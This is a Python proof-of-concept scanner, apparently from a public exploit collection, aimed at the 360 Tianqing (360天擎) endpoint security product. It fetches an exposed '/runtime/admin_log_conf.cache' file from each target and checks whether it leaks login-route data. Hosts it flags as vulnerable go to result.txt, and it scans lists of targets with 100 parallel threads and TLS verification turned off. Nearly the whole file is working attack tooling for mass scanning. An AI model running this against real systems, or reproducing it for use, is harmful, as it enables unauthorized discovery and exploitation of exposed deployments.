import argparse, requests, os, sys, re
from multiprocessing.dummy import Pool

def banner():
    test = """   
██████╗  ██████╗  ██████╗ ████████╗ ██████╗ 
╚════██╗██╔════╝ ██╔═████╗╚══██╔══╝██╔═══██╗
 █████╔╝███████╗ ██║██╔██║   ██║   ██║   ██║
 ╚═══██╗██╔═══██╗████╔╝██║   ██║   ██║▄▄ ██║
██████╔╝╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝    ╚═╝    ╚══▀▀═╝ 
                                   author:sanhua
                                   date:2024-09-03
                                   version:1.0
"""
    print(test)

def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent' : 'Mozilla/5.0(Windows NT 10.0;Win64;X64;rv:128.0)Gecko/20100101 Firefox/128.0'
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, timeout=10,verify=False)
        content = re.findall(r's:12:"(.*?)";', res1.text, re.S)
        if '/login/login' in content:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
            print(f"[+]{target}存在漏洞")
        elif res1.status_code != 200:
            print(f"[!]{target}可能存在问题，请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"[!]{e}")

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="360天擎漏洞")
    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!]{args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 360TQ.py -h")

if __name__ == '__main__':
    main()